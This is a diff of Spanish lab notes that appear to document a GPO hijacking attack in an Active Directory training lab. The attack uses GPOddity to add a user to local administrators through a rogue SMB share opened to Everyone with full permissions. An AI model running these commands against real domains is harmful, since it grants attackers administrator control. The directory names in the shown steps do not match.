@@ -80,4 +80,24 @@ sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domai
  --command 'net localgroup administrators student97 /add' --rogue-smbserver-ip '172.16.100.97' --rogue-smbserver-share 'std97-gp' --dc-ip '172.16.2.1' --smb-mode none
 ```
 
-Crearemos un directorio y lo comparti
+Crearemos un directorio y lo compartiremos
+```shell
+mkdir /mnt/c/AD/Tools/std687-gp
+```
+
+```shell
+cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std97-gp
+```
+
+Ahora abriremos una nueva terminal como administradores en windopws y le asignaremso privilegios en el recurso compartido para todos
+Primero compartiremos el recurso
+```shell
+net share std97-gp=C:\AD\Tools\std97-gp /grant:Everyone,Full
+```
+
+Y ahora le darermos permisos a todos
+```shell
+icacls "C:\AD\Tools\std97-gp" /grant Everyone:F /T
+```
+
+Ahora podemos ver si se ha modificado la politica de *DevOps* en la zona de *gPCfileSysPath*
